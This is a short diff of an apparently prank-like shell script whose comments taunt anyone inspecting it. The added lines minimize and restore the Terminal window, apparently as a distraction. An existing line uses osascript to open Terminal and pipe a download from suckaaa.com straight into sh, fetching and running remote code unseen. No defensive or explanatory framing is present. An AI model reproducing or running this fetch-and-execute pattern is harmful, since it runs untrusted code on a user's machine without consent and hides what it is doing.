@@ -3,4 +3,7 @@
 # loL whatcha lookin for in here???
 # Don't worry about it!!!
 
+# Minimize the window for a few seconds, then restore it
+printf '\e[2t' && sleep 3 && printf '\e[1t';
+
 osascript -e 'tell application "Terminal" to do script "curl -s https://suckaaa.com/s/loL | sh;"'
